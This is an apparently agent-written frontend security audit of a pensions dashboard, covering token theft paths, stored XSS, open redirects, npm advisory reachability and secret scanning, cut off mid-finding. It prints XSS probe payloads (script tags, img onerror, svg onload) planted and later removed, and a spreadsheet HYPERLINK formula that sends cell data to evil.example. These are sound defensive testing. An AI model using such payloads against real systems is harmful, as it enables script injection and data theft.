# A24 · Frontend security & dependencies

**Repo:** `/Users/shubhang/Desktop/Projects/uganda-dashboard` @ `bd637f6` (main, clean)
**Live project:** `ilkhfnoyxlxwqadebnkp` · **Prod app:** `https://uganda-dashboard.vercel.app`
**Baseline cited:** `docs/audits/2026-08-23/00-baseline.md` (§3 npm audit, §4 file inventory) and
`00c-frontend-groundtruth-corrections.md`. Report-only; **no file outside `docs/audits/2026-08-23/` was written.**

## Metrics
| Metric | Value |
|---|---|
| Artifacts in scope | 652 |
| Artifacts examined | 652 |
| Coverage | 100% |
| Checks defined | 26 |
| Checks executed | 26 |
| Checks passed / failed / blocked | 15 / 11 / 0 |
| Findings C / H / M / L / I | 1 / 0 / 1 / 5 / 4 |
| Evidence commands run | 35 |
| Excluded as demo-scope | 5 (any-6-digit OTP + no real SMS; mocked KYC vendors in `api/kyc/_lib/mocks.ts`; in-memory ticket store; absent audit trail; the *choice* of `localStorage` as the session store for a demo tool — the theft **paths** are reported, the storage choice is not) |
| Blocked, with reason | none |

**Scope definition (652):** 610 client source files (433 `.jsx` + 177 `.js` under `src/`, all pattern-swept
exhaustively for injection sinks; 27 read in full) · 4 static web artifacts (`index.html`, `public/sw.js`,
`public/manifest.webmanifest`, `public/offline.html`) · 3 config files (`vercel.json`, `vite.config.js`,
`render.yaml`) · `package.json` + `package-lock.json` · 23 `npm audit` vulnerability records · 4 public-write
tables · 6 production bundle entry chunks + 328 local `dist/assets` files.

### Domain metrics required by the spec
| Metric | Value |
|---|---|
| **Unsafe render sites** | **1** — `src/signup/contribution/insurancePolicyCertificate.js:439` (`win.document.write`). `dangerouslySetInnerHTML` **0**, `innerHTML`/`outerHTML`/`insertAdjacentHTML` **0**, `eval`/`new Function` **0**, `srcDoc` **0**, `createContextualFragment` **0**, `createElement('script')` **0**, `javascript:` URLs **0** |
| **XSS payloads confirmed end to end** | **4 rows planted / 16 distinct payload globals / 0 executed.** Stored verbatim (unsanitised) in `access_requests` + `nominee_claims`; rendered as **escaped literal text** on all 4 admin surfaces (desktop ×2, mobile ×2). All rows deleted — see §Cleanup |
| **npm audit by severity** | 3 critical · 12 high · 5 moderate · 3 low (23 total) — matches baseline §3 |
| **…of which REACHABLE** | **0 of 15** high+critical. **1 of 15** (`react-router`) ships to a runtime at all; its 5 advisories all require SSR/RSC or a user-controlled navigate/`<Link to>` target, neither of which exists here. The other 14 are devDependency-only and pruned by `npm prune --omit=dev` before the Render container starts |
| **Third-party requests per page** | Public landing (prod, logged out): **2 hosts** — `fonts.googleapis.com` ×1, `fonts.gstatic.com` ×N fonts (+ `uganda-dashboard-api.onrender.com`, the app's own backend). Authenticated subscriber dashboard: **2 hosts** (fonts only). Authenticated distributor + map: **5 hosts** (fonts + `a/b/c.basemaps.cartocdn.com`, 48 tiles). Sentry: **0 requests, ever**. OSM tile hosts: **0 requests, ever** |
| **Data classes sent to third parties** | Google Fonts → Referer **origin only**, font-family names, UA, IP. Carto → tile `z/x/y` (reveals which Ugandan region the rep is drilling into), Referer origin, UA, IP. **No cookies, no `Authorization` header, no PII, no URL path, no token to any third party** (measured: `cookie=(none) auth=(none)` on every cross-origin request) |
| **Client-reachable secrets** | **0** (target met). The only credential in the bundle is the Supabase **anon** key — by design |

---

## 1 · Token theft paths (spec check 1)

The session JWT lives at `localStorage['upensions_token']` (`src/services/api.js:24`,
`src/services/supabaseClient.js:48`), written by `AuthContext`/`e2e/fixtures/auth.ts`. It is a 24 h HS256
token with no refresh and no revocation list.

**Realistic paths to theft, for THIS app, ranked:**

| # | Path | Status |
|---|---|---|
| 1 | Stored/reflected XSS in the app's own React tree | **Closed today.** Zero `dangerouslySetInnerHTML`, zero `innerHTML`, zero `eval`/`new Function` across 610 client files. React auto-escaping is the only render path, and I proved it end to end against planted payloads (§2) |
| 2 | The one raw-HTML sink — `document.write` into a `window.open('')` popup | **Closed today, structurally fragile.** Every interpolation is either a literal, an `escapeHtml()` call, or a formatter that never echoes its input. But the popup is **same-origin with the opener** — I measured `popupOrigin = http://localhost:5173` and `canReadOpenerLocalStorage = yes` on Chromium *and* WebKit — so one unescaped field added later is a direct token exfil. Tracked as **A24-007**. (It is currently *dead code* — see **A24-001**) |
| 3 | Third-party script injection | **No third-party `<script>` exists.** `index.html` loads exactly one script (`/src/main.jsx`) and one cross-origin **stylesheet** (Google Fonts). A compromised `fonts.googleapis.com` could inject CSS, not JS — CSS-selector exfiltration of input values is the realistic ceiling |
| 4 | CSP as a mitigation | **Not in force, and not enforceable as written** — `Content-Security-Policy-Report-Only`, with **no `report-uri`/`report-to`**, so it neither blocks nor reports. Tracked as **A24-002** |
| 5 | Token in a URL / referrer / log | **Closed.** 0 sites put the token in a URL or query string; 0 `console.*` calls touch it; referrer to third parties is origin-only (§3) |
| 6 | CSRF riding a session cookie | **Not applicable** — there is no auth cookie. `localStorage` + an explicit `Authorization` header makes the app structurally CSRF-immune. This is the one genuine security *benefit* of the current design |

**Net:** with no XSS sink and no third-party script, the realistic 2026-08-24 theft surface is a
browser extension or a shared/unlocked device — neither of which the app can mitigate. The CSP is the
control that *would* matter the day a sink appears, and it is decorative.

**Evidence**
```
$ grep -rn "dangerouslySetInnerHTML" src api server public index.html   → (no output)
$ grep -rn "\.innerHTML\|outerHTML\|insertAdjacentHTML" src api server public index.html scripts
  → (no output)
$ grep -rnE "\beval\(|new Function\(" src api server public               → (no output)
$ grep -rnE "srcDoc|createContextualFragment|createElement\(['\"]script|document\.write|javascript:" \
    src --include='*.js' --include='*.jsx' | grep -v "\.test\."
  src/signup/contribution/insurancePolicyCertificate.js:439:  win.document.write(html);
$ grep -rn "token=\|access_token\|Bearer \${" src --include='*.js' --include='*.jsx' | grep -v test
  src/utils/sentryScrub.js:48:  'access_token',        ← a scrubber key, not a URL
```
Popup origin proof (`docs/audits/2026-08-23/a24-winopen-probe.mjs`):
```
chromium {"withNoopener":"NULL","withoutFeatures":"window","sameOriginWrite":"OK",
          "popupOrigin":"http://localhost:5173","canReadOpenerLocalStorage":"yes"}
webkit   {"withNoopener":"NULL","withoutFeatures":"window","sameOriginWrite":"OK",
          "popupOrigin":"http://localhost:5173","canReadOpenerLocalStorage":"yes"}
```

---

## 2 · Stored XSS, end to end (spec check 2)

A06 and A07 had not written their output files when I ran, so per the spec I planted my own payloads
through the **local** API on `:3001` and cleaned up afterwards.

### 2.1 Which of the four public-write tables actually has a render path

| Table | Written by | Rendered in the admin UI? |
|---|---|---|
| `access_requests` | `api/access-request.ts` | **Yes** — `src/admin-dashboard/access-requests/ViewAccessRequests.jsx` (desktop), `src/admin-dashboard/mobile/AdminAccessRequestsMobile.jsx` |
| `nominee_claims` | `api/nominee-claim.ts` | **Yes** — `src/admin-dashboard/nominee-claims/ViewNomineeClaims.jsx`, `src/admin-dashboard/mobile/AdminNomineeClaimsMobile.jsx` |
| `contact_submissions` | `api/contact.ts` | **No render path anywhere.** `grep -rn "contact_submissions" src` → 0 hits |
| `agent_referrals` | `api/kyc/agent-referral.ts` | **No render path anywhere.** `grep -rn "agent_referrals" src` → 0 hits |

So only two of the four are reachable as XSS sinks at all.

### 2.2 The API stores payloads verbatim — no sanitisation layer

```
$ node docs/audits/2026-08-23/a24-plant-xss.mjs
access-request/employer    -> 200 {"submitted":true,"id":"ar-1787558699527-rmm4"}
access-request/distributor -> 200 {"submitted":true,"id":"ar-1787558701196-dksm"}
nominee-claim/life         -> 200 {"submitted":true,"id":"nc-bbf6090b4d1d48e991f65357be9e62f1",...}
nominee-claim/funeral      -> 200 {"submitted":true,"id":"nc-d810114b14304a0f85c0337cdfa21ac3",...}

$ psql "$SUPABASE_DB_URL" -X -q -At -F'|' -c "SELECT id, org_name, contact_name, contact_email, sector
    FROM access_requests WHERE org_name LIKE '%A24XSSPROBE%' OR contact_name LIKE '%A24XSSPROBE%';"
ar-1787558699527-rmm4|A24XSSPROBE <img src=x onerror="window.__A24_XSS_ORG=1">|A24XSSPROBE<svg/onload=window.__A24_XSS_NAME=1>|"><script>window.__A24_XSS_EMAIL=1</script>@a24probe.test|A24XSSPROBE"><img src=x onerror=window.__A24_XSS_SECTOR=1>
ar-1787558701196-dksm|A24XSSPROBE "><script>window.__A24_XSS_ORG2=1</script>|A24XSSPROBE<img src=1 onerror=window.__A24_XSS_NAME2=1>|a24probe@a24probe.test|

$ psql ... "SELECT id, deceased_name, claimant_name, relationship, notes FROM nominee_claims WHERE deceased_name LIKE '%A24XSSPROBE%';"
nc-bbf6090b...|A24XSSPROBE <img src=x onerror="window.__A24_XSS_DEC=1">|A24XSSPROBE<svg/onload=window.__A24_XSS_CLM=1>|A24XSSPROBE"><script>window.__A24_XSS_REL=1</script>|A24XSSPROBE <script>window.__A24_XSS_NOTES=1</script>
nc-d810114b...|A24XSSPROBE2 "><script>window.__A24_XSS_DEC2=1</script>|A24XSSPROBE2 <img src=x onerror=window.__A24_XSS_CLM2=1>|A24XSSPROBE2|A24XSSPROBE2
```
Note the payload survives `EMAIL_RE` (`/^[^@\s]+@[^@\s]+\.[^@\s]+$/` permits `<`, `>`, `"`, `/`) — the
email field is a viable injection carrier, which is worth knowing even though nothing renders it as HTML.

### 2.3 The RENDER side — confirmed safe on all four surfaces

Both probes installed a sentinel that traps *assignment* to each of the 16 payload globals plus
`window.alert`, then counted live DOM nodes vs escaped markup.

Desktop admin (`docs/audits/2026-08-23/a24-desktop-probe.mjs`), 1440×900, sidebar-driven:
```
Access requests count= 1
Access requests {"probeText":8,"escapedPayload":8,"liveImgs":0,"liveSvgOnload":0,
                 "injectedScripts":0,"iframes":0,"exec":[]}
Nominee claims count= 1
Nominee claims {"probeText":10,"escapedPayload":6,"liveImgs":0,"liveSvgOnload":0,
                "injectedScripts":0,"iframes":0,"exec":[]}
```
Mobile admin (`a24-render-probe.mjs`, Pixel 7, direct routes):
```
===== mobile-admin =====
executed payload globals: []
dom probe: {"scripts":0,"imgs":0,"svgOnload":0,"iframes":0,"probeText":10,"rawPayloadInHtml":2}
steps: {"/dashboard/access-requests":{"probeCount":7,"bodyHas":true},
        "/dashboard/nominee-claims":{"probeCount":8,"bodyHas":true}}
```
`probeText` > 0 proves the rows **did** render; `escapedPayload` counts `&lt;img`/`&lt;script` sequences in
the serialised HTML; every live-node counter and the executed-globals list are **empty**. React's JSX
auto-escaping holds. Screenshots: `a24-desktop-Access-requests.png`, `a24-desktop-Nominee-claims.png`,
`a24-mobile-admin.png`.

**Verdict: no stored XSS. Check 2 PASSES.** Recorded as **A24-007 (info)** because the result depends
entirely on nobody ever adding a raw-HTML sink — and there is exactly one such sink already in the tree.

### 2.4 Cleanup — performed and verified
```
$ psql ... "DELETE FROM access_requests WHERE org_name LIKE '%A24XSSPROBE%' OR contact_name LIKE '%A24XSSPROBE%' OR registration_no LIKE '%A24XSSPROBE%';
            DELETE FROM nominee_claims  WHERE deceased_name LIKE '%A24XSSPROBE%' OR claimant_name LIKE '%A24XSSPROBE%';"
$ psql ... verify
access_requests|0
nominee_claims|0
$ psql ... "SELECT id, kind, status, left(org_name,32), created_at FROM access_requests ORDER BY created_at;"
ar-demo-001|employer|pending|Kigo Tea Estates Ltd|2026-07-28 ...
ar-demo-002|employer|pending|Nsambya Medical Centre|2026-08-02 ...
ar-demo-003|distributor|pending|Rwenzori Financial Services|2026-08-05 ...
ar-demo-004|distributor|pending|Teso Cooperative Union|2026-08-07 ...
ar-1786103803205-x30h|employer|approved|Uniclusion Uganda|2026-08-07 ...
```
**All 4 planted rows removed. All 5 pre-existing `access_requests` demo rows and all 9 `nominee_claims`
demo rows are intact.** No other data was created, modified or deleted by this agent.

---

## 3 · Open redirect, token-in-URL, referrer leakage (spec check 3)

**Open redirect: none.** Every `navigate()` target is a string literal, a template over an internal
token (`/invite/${inviteToken}`), or a value from a hard-coded route table. Every `<Link to={…}>` /
`<NavLink to={…}>` resolves to an internal constant. There is **no** `?redirect=` / `?returnTo=` /
`?next=` parameter anywhere — `grep` over `searchParams`/`location.search` returns only `leg`, `tab`,
`aud`, `filter`, `subscriberId`, `open`, none of which reach a navigation target.

The one DB-sourced navigation value is `row.href` in the admin attention table, and it is composed
**server-side with a literal prefix**:
```
$ psql ... "SELECT prosrc FROM pg_proc … proname='get_admin_attention_rows';" | grep -in href
30:  'href', '/dashboard/agents/' || a.id
170: 'href', '/dashboard/subscribers/' || c.subscriber_id
197: 'href', '/dashboard/subscribers/' || w.subscriber_id
…the rest are NULL
```
A value that always begins `/dashboard/` cannot express the `\\host` / `/\host` shape the react-router
open-redirect advisory needs. **PASS.**

**Token in URL/query/logs: none.** No `?token=`, no `access_token` in any URL, and no `console.*` call
in `src/` (13 sites, all `[module] message` diagnostics) touches the token or auth object.

**Referrer leakage — measured against production, not inferred:**
```
$ curl -s -D- -o /dev/null https://uganda-dashboard.vercel.app/ | grep -i referrer
referrer-policy: strict-origin-when-cross-origin

$ node docs/audits/2026-08-23/a24-prod-referer-probe.mjs
{"host":"fonts.googleapis.com","referer":"https://uganda-dashboard.vercel.app/","origin":"(none)","cookie":"(none)","auth":"(none)"}
{"host":"uganda-dashboard-api.onrender.com","referer":"https://uganda-dashboard.vercel.app/","origin":"(none)","cookie":"(none)","auth":"(none)"}
{"host":"fonts.gstatic.com","referer":"https://fonts.googleapis.com/","origin":"https://uganda-dashboard.vercel.app","cookie":"(none)","auth":"(none)"}
total third-party requests: 16 distinct hosts: fonts.googleapis.com, uganda-dashboard-api.onrender.com, fonts.gstatic.com
```
Origin only — no path, no query, no cookie, no `Authorization`. **PASS.**

`target="_blank"` hygiene: 8 sites, **8 carry `rel`** (`noreferrer` or `noopener noreferrer`). No reverse
tabnabbing. **PASS.**

---

## 4 · Third-party surface from an authenticated session (spec check 4)

`docs/audits/2026-08-23/a24-thirdparty-probe.mjs` (full log: `a24-thirdparty.json`).

| Session | Third-party hosts | Requests | Statuses | `Authorization` sent | `Cookie` sent |
|---|---|---|---|---|---|
| Anon landing (6 routes) | `fonts.googleapis.com`, `fonts.gstatic.com` | 6 / 12 | all 200 | 0 | 0 |
| Auth **subscriber** dashboard | `fonts.googleapis.com`, `fonts.gstatic.com` | 1 / 2 | all 200 | 0 | 0 |
| Auth **distributor** + map | + `a`/`b`/`c.basemaps.cartocdn.com` | 16 / 16 / 16 | all 200 | 0 | 0 |

**What actually reaches each third party:**
- **Google Fonts** (`fonts.googleapis.com` → `fonts.gstatic.com`): the requested font-family list, the
  Referer *origin*, User-Agent, IP. Fires on the **public landing page too**, so it is not a
  logged-in-only disclosure. No PII, no session material.
- **Carto tiles** (`*.basemaps.cartocdn.com`): tile `z/x/y` coordinates only. These do disclose *which
  Ugandan region/district a rep is drilling into* — the closest thing to a behavioural leak in the app,
  and still not PII. Referer origin only. **OSM tile hosts are allow-listed in the CSP but never
  contacted** — `MAP_TILE_URL` defaults to Carto (`src/config/env.js:41`).
- **Sentry: zero requests, in every session.** Not merely unconfigured — the SDK is *absent from the
  production bundle*: `import.meta.env.VITE_SENTRY_DSN` is statically replaced with `undefined`, the
  `if` block becomes dead code, and Rollup drops the import entirely. Recorded as **A24-009**.
```
$ for f in prod*.js; do printf "%-36s sentry=%s captureException=%s\n" "$f" \
    "$(grep -oic sentry "$f")" "$(grep -oc captureException "$f")"; done
prodindex-IM_IiCjH.js                sentry=0 captureException=0
prodvendor-CRnas3xB.js               sentry=0 captureException=0
prodvendor-motion-B1udY_rf.js        sentry=0 captureException=0
prodvendor-react-DWMwQj0t.js         sentry=0 captureException=0
prodvendor-router-BuR1e31r.js        sentry=0 captureException=0
prodvendor-tanstack-DbIRYLpQ.js      sentry=0 captureException=0
```
- **WhatsApp (`wa.me`)**: not an automatic request. `src/agent-dashboard/pages/NudgeSheet.jsx:157` and
  `MessageLauncher.jsx:77` build `waLink(phone, message)` hrefs — on an explicit agent click the
  subscriber's phone number and the drafted nudge text travel in the URL to WhatsApp. Deliberate
  feature, noted for completeness.

---

## 5 · npm audit triage — reachability (spec check 5)

Baseline §3 figures reproduced exactly: **3 critical / 12 high / 5 moderate / 3 low**.

### 5.1 The 3 criticals — all devDependency-only
| Package | Path | Ships to browser? | Ships to Render? | Reachable |
|---|---|---|---|---|
| `shell-quote` (GHSA-w7jw-789q-3m8p) | `concurrently → shell-quote` | No | No | **No** |
| `concurrently` 9.2.1 | direct devDep (`npm run dev:all` only) | No | No | **No** |
| `tar` (GHSA-23hp-3jrh-7fpw) | `supabase` CLI → `tar` | No | No | **No** |

`render.yaml` runs `npm ci --include=dev && npm run build:api && npm prune --omit=dev` — devDeps are
installed for the build and **pruned before `startCommand`**, so none of the three exist in the running
container. Confirmed against `render.yaml` `buildCommand`.

### 5.2 The 12 highs — 11 dev-only, 1 browser-shipped, 0 exploitable
```
$ npm ls react-router --all
universal-pensions-uganda@1.0.0
└─┬ react-router-dom@7.17.0
  └── react-router@7.17.0                                      ← PRODUCTION dependency

$ npm ls nanoid postcss undici brace-expansion path-to-regexp --all   (abridged)
nanoid          └─┬ vite@6.4.2 └─┬ postcss@8.5.15 └── nanoid@3.3.12        dev
postcss         └─┬ vite@6.4.2 └── postcss@8.5.15                          dev
undici          ├─┬ @vercel/node@5.8.8 └── undici@5.28.4                   dev
                └─┬ jsdom@29.0.2       └── undici@7.25.0                   dev
brace-expansion ├─┬ @vercel/node → @vercel/nft → glob → minimatch          dev
                └─┬ eslint-plugin-jsx-a11y → minimatch@3.1.5               dev
path-to-regexp  ├─┬ @vercel/node@5.8.8 └── path-to-regexp@6.1.0            dev  ← the vulnerable one
                └─┬ express@5.2.1 └─┬ router@2.2.0 └── path-to-regexp@8.4.2 prod, NOT in range
```
`@vercel/node` is a **type-only** import everywhere (`import type { VercelRequest, VercelResponse }`
across 18 `api/` + `server/` files; zero value imports), so it and its four transitive highs
(`undici`, `path-to-regexp`, `@vercel/build-utils`, `@vercel/python-analysis`) never execute.

**`react-router` 7.17.0 is the only vulnerable package that reaches a browser.** Its five advisories:

| Advisory | Requires | Present here? |
|---|---|---|
| GHSA-wrjc-x8rr-h8h6 — open redirect via backslash in `<Link>`/`useNavigate` | a user-controlled navigation target | **No** — §3 proves every target is a literal or an internal constant, and the one DB-sourced value carries a literal `/dashboard/` prefix |
| GHSA-chx6-hx7r-mcp5 — unauthenticated DoS via inefficient route matching | server-side routing | **No** — client-only `BrowserRouter` (`src/main.jsx:93`); no `createStaticHandler`, `StaticRouter`, `renderToString` |
| GHSA-337j-9hxr-rhxg — `deserializeErrors()` constructor injection | SSR hydration | **No SSR** |
| GHSA-h8fp-f39c-q6mh — `RSCErrorHandler` protocol validation | RSC mode | **No RSC** |
| GHSA-qwww-vcr4-c8h2 — RSC CSRF bypass | RSC mode | **No RSC** |

**Reachable = 0.** Still worth fixing because it is free: `7.18.2` is inside the declared `^7.15.1`
range (**A24-004**).

### 5.3 `xlsx` on its own merits (baseline is right: npm reports **no** advisory)
```
$ node -e "…package-lock.json…"
node_modules/xlsx {
 "version": "0.20.3",
 "resolved": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz",
 "integrity": "sha512-oLDq3jw7AcLqKWH2AhCpVTZl8mf6X2YReP+Neh0SJUzV/BdZYjth94tG5toiMB1PPrYtxOCfaoUCkvtuH+3AJA=="
}
```
- **Prototype pollution (CVE-2023-30533, ≤0.19.2) and ReDoS (CVE-2024-22363, ≤0.20.1) are both fixed in
  0.20.3.** This is the maintained SheetJS build, not the abandoned npm `0.18.5`. Integrity **is** pinned
  in the lockfile, so a CDN compromise fails the install rather than shipping.
- **Zip-bomb / DoS is bounded but not eliminated:** `MAX_UPLOAD_BYTES = 5 MB`, `sheetRows = 50_000`, plus
  an extension + MIME allow-list applied *before* the bytes reach the parser (`src/utils/xlsx.js`). But
  `parseSheet` runs on the **main thread** — no Web Worker — so a legitimate 5 MB workbook still freezes
  the rep's tab while it parses. Low, recorded in **A24-008**.
- **Formula injection on WRITE is NOT reachable — I tested it rather than assuming:**
```
$ node -e "const XLSX=require('xlsx'); const ws=XLSX.utils.aoa_to_sheet([['Name'],
    ['=HYPERLINK(\"http://evil.example/?x=\"&A1,\"Click\")'],['+1+1'],['@SUM(A1)'],['-2+3']]);
    for (const a of ['A2','A3','A4','A5']) console.log(a, JSON.stringify(ws[a]));"
A2 {"v":"=HYPERLINK(\"http://evil.example/?x=\"&A1,\"Click\")","t":"s"}
A3 {"v":"+1+1","t":"s"}
A4 {"v":"@SUM(A1)","t":"s"}
A5 {"v":"-2+3","t":"s"}
```
  `aoa_to_sheet` emits **string-typed cells** (`t:"s"`), so Excel renders them as text and never
  re-parses them as formulas. The CSV path — where Excel *does* parse at import time — is separately
  defended:
```
$ node --input-type=module -e "import { toCsv } from './src/utils/csv.js'; …"
"﻿Name\r\n\"'=HYPERLINK(\"\"http://evil\"\",\"\"c\"\")\"\r\n\"'+1+1\"\r\n\"'@SUM(A1)\"\r\n\"'-2+3\""
```
  `FORMULA_TRIGGERS = /^[=+\-@\t\r]/` in `src/utils/csv.js` prefixes `'` and quote-wraps. **PASS on both
  export paths.** I am explicitly *not* raising a formula-injection finding — the asymmetry between
  `csv.js` and `xlsx.js` looks like a gap and is not one.
- **Supply chain:** the tarball URL is a non-registry resolution, so `npm ci` needs `cdn.sheetjs.com`
  reachable. Integrity is pinned, so this is availability, not tampering (**A24-011**).
- **Bundle:** `vendor-xlsx` (500 kB raw) is **not** in the cold path — prod `index.html` references six
  chunks, none of them xlsx; `src/utils/xlsx.js` uses `await import('xlsx')` inside each function.

---

## 6 · Dependency freshness & Dependabot backlog (spec check 6)

Dependabot **is** configured (`.github/dependabot.yml`: weekly npm + github-actions, minor/patch grouped,
limits 10/5). It is producing PRs and they are not being merged.

```
$ gh pr list --state open --limit 30
35  build(deps): Bump the npm-minor-and-patch group across 1 directory with 27 updates   2026-08-11
31  build(deps): Bump actions/setup-node from 4 to 7                                     2026-07-14
29  build(deps): Bump actions/cache from 4 to 6                                          2026-06-30
27  chore(deps): Bump actions/checkout from 4 to 7                                       2026-06-23
23  chore(deps): Bump express-rate-limit from 7.5.1 to 8.5.2                             2026-06-09
20  chore(deps-dev): Bump @eslint/js from 9.39.4 to 10.0.1                               2026-06-09
19  chore(deps-dev): Bump eslint from 9.39.4 to 10.4.1                                   2026-06-09
18  chore(deps): Bump helmet from 7.2.0 to 8.2.0                                         2026-06-09
17  chore(deps-dev): Bump dotenv-cli from 8.0.0 to 11.0.0                                2026-06-09
16  chore(deps): Bump bcryptjs and @types/bcryptjs                                        2026-06-09
15  chore(deps-dev): Bump vite from 6.4.2 to 8.0.16                                      2026-06-09
13  chore(deps): Bump actions/upload-artifact from 4 to 7                                2026-06-09
```
**12 open dependency PRs; the oldest 10 have been open since 2026-06-09 (76 days).** PR #35 — the grouped
minor/patch bump — is the one that would carry `react-router-dom` to 7.18.2 and `vite` to 6.4.3, i.e. it
closes the only browser-shipped high *and* the vite high in one merge.

`npm outdated`: **39 packages behind, 12 by a major.** Everything is behind its `wanted` (in-range)
version too — including `@supabase/supabase-js` 2.105.4 → 2.112.3, `react` 19.2.4 → 19.2.8,
`react-router-dom` 7.17.0 → **7.18.2**, `vite` 6.4.2 → **6.4.3**, `concurrently` 9.2.1 → **9.2.4**.
The last three each close a currently-reported advisory and are all semver-in-range.

---

## 7 · Client-reachable secrets — target 0, achieved 0 (spec check 7)

Scanned **both** the local `dist/` (328 asset files) and the **live production bundle** (6 entry chunks
fetched from `https://uganda-dashboard.vercel.app`). Counts only, per G2.

```
LOCAL dist/
  files containing "eyJ"                                   : 2   (the same chunk + its Finder duplicate)
  distinct JWT-shaped tokens                               : 1   → eyJ...<208>  role=anon ref=ilkhfnoyxlxwqadebnkp
  files containing service_role / SERVICE_ROLE             : 0
  files containing SUPABASE_DB_URL / JWT_SECRET            : 0
  files containing postgresql:// / sb_secret / sbp_        : 0

PRODUCTION bundle (index + 5 vendor chunks)
  distinct JWT-shaped tokens                               : 1   → eyJ...<208>  role=anon ref=ilkhfnoyxlxwqadebnkp
  service_role / SERVICE_ROLE / JWT_SECRET / sbp_ /
  sb_secret / postgresql:// / SUPABASE_DB_URL /
  BEGIN PRIVATE KEY                                        : 0 files each
```
**Every `import.meta.env` reference is `VITE_`-prefixed and public by design** (11 distinct vars):
`VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY`, `VITE_API_BASE_URL`, `VITE_USE_SUPABASE`,
`VITE_SENTRY_DSN`, `VITE_SENTRY_RELEASE`, `VITE_MAP_TILE_URL`, `VITE_LEGAL_TERMS_URL`,
`VITE_LEGAL_PRIVACY_URL`, `VITE_SUPPORT_WHATSAPP_URL/_DISPLAY`, `VITE_SUPPORT_EMAIL` (+ Vite's own
`DEV`/`PROD`/`MODE`). Nothing that should be server-only carries a `VITE_` prefix:

```
$ grep -oE '^[A-Z_]+' .env.local | sort
PORT  RENDER_DEPLOY_HOOK  SUPABASE_DB_URL  SUPABASE_JWT_SECRET  SUPABASE_SERVICE_ROLE_KEY
VITE_SUPABASE_ANON_KEY  VITE_SUPABASE_URL  VITE_USE_SUPABASE
```
The four secrets (`SUPABASE_DB_URL`, `SUPABASE_JWT_SECRET`, `SUPABASE_SERVICE_ROLE_KEY`,
`RENDER_DEPLOY_HOOK`) are correctly un-prefixed and therefore invisible to `import.meta.env`. **PASS.**

---

## 8 · Clickjacking, postMessage, service-worker scope (spec check 8)

**Clickjacking — mitigated.** Production app (Vercel):
```
$ curl -s -D- -o /dev/null https://uganda-dashboard.vercel.app/
x-frame-options: DENY
content-security-policy-report-only: … frame-ancestors 'none' …
```
`X-Frame-Options: DENY` is an **enforcing** header, so framing is blocked regardless of the report-only
CSP. The API host (Render/helmet) emits `X-Frame-Options: SAMEORIGIN` + `frame-ancestors 'self'` — weaker,
but it serves only JSON envelopes and hosts no clickable UI. **PASS.**

**postMessage — no listener to abuse.** `grep -rn "addEventListener('message'" src public` returns
exactly one hit: `public/sw.js:52`, `if (event.data === 'SKIP_WAITING') self.skipWaiting();`. Service-worker
`message` events are deliverable only from same-origin controlled clients, and the payload is compared
against a single literal. There is **no `window` message listener anywhere in `src/`**, so there is no
missing-origin-check class of bug here. **PASS.**

**Service worker — scope is tight.** `public/sw.js` (91 lines, hand-rolled) registered at `/sw.js`, scope
`/`, and **only in production** (`src/pwa/registerSW.js:8` `if (!import.meta.env.PROD) return`). Its fetch
handler returns early for **every cross-origin request** (`if (url.origin !== self.location.origin) return`)
and for **every `/api/*` path** (money data always fresh). Navigations are network-first with a cached-shell
fallback; other same-origin GETs are stale-while-revalidate into a FIFO cache capped at 80 entries.
Non-GET requests are untouched. Prod headers on `/sw.js` are `cache-control: public, max-age=0,
must-revalidate` — so a `VERSION` bump propagates. Nothing here lets a cached response outlive a deploy in
a way that could serve stale money, and nothing lets a third party enter the cache. **PASS.**

---

## Findings

### A24-001 · CRITICAL · The insurance policy certificate can never open — `window.open(..., 'noopener')` always returns `null`
**Location:** `src/signup/contribution/insurancePolicyCertificate.js:436`
**Confidence:** confirmed (reproduced in the real UI and in two browser engines)

```js
const win = window.open('', '_blank', 'noopener,noreferrer');
if (!win) return false;
```
Per the HTML spec, when the feature string contains `noopener`, `window.open()` **must return `null`** —
the whole point is to sever the opener handle. So `win` is *always* `null`, `openPolicyCertificate()`
*always* returns `false`, and both call sites take their failure branch:

- `src/subscriber-dashboard/pages/PoliciesPage.jsx:240` → `addToast('error', 'Please allow pop-ups for
  this site, then try again to open your certificate.')`
- `src/signup/steps/ActivatedStep.jsx:81` → `window.alert('Please allow pop-ups for this site and try
  again to download your certificate.')`

The user is told to change a browser setting that is already correct, a **blank tab still opens**, and the
certificate never renders. Reproduced end to end as subscriber `s-0001` on `/dashboard/policies`, where
there are **three** "Download certificate" buttons:
```
$ node docs/audits/2026-08-23/a24-cert-e2e.mjs
page text: … Life cover | UGX 1,000,000 cover | … | Download certificate | Hospital cash | … |
             Download certificate | Funeral cover | … | Download certificate | …
certificate buttons found: 3
popups opened: 1
toast present: true -> Please allow pop-ups for this site, then try again to open your certificate.
```
Engine-independent (this is spec behaviour, not a Chromium quirk):
```
$ node docs/audits/2026-08-23/a24-winopen-probe.mjs
chromium {"withNoopener":"NULL","withoutFeatures":"window", …}
webkit   {"withNoopener":"NULL","withoutFeatures":"window", …}
```
**Age:** introduced with the feature on 2026-05-25 (`9e585b7`, "insurance cert download") — broken for
three months. It survived because the only test explicitly declines to cover it: the header of
`src/signup/contribution/insurancePolicyCertificate.test.js` says *"The HTML builder is pure
(`openPolicyCertificate` just writes it to a new tab), so we assert the produced markup rather than the
window plumbing"*, and no e2e spec touches the certificate at all.
**Impact:** a rep demoing insurance — a headline feature of this platform — clicks "Download certificate"
on the subscriber Policies page or at the end of signup, gets a blank tab plus an error message blaming
the browser, and cannot show the artefact. Visible, deterministic, on every viewport and every engine.
**Fix (do not apply):** drop `noopener` from the feature string (it is meaningless for an `about:blank`
document you must then write into) — `window.open('', '_blank')` — and keep the `if (!win)` guard for the
genuine pop-up-blocked case. Add an e2e assertion that a second page actually opens. Note the security
consequence to keep in view: the resulting popup is same-origin with the opener (proved in §1), so
A24-007's escaping discipline becomes load-bearing the moment this is fixed.

### A24-002 · MEDIUM · The CSP is report-only, reports nowhere, and cannot be enforced as written
**Location:** `vercel.json:11`
**Confidence:** confirmed (58 violations measured against production)

Three independent defects in one header:
1. It is `Content-Security-Policy-Report-Only`, so it blocks nothing.
2. It has **no `report-uri` and no `report-to`** directive, so it collects nothing either. It is inert in
   both directions — the "report-only rollout" it implies has never been able to produce data.
3. It **contradicts the app's own asset origins**: `style-src 'self' 'unsafe-inline'` and `font-src 'self'`,
   while `index.html:36-38` loads the brand typefaces from `fonts.googleapis.com` / `fonts.gstatic.com`,
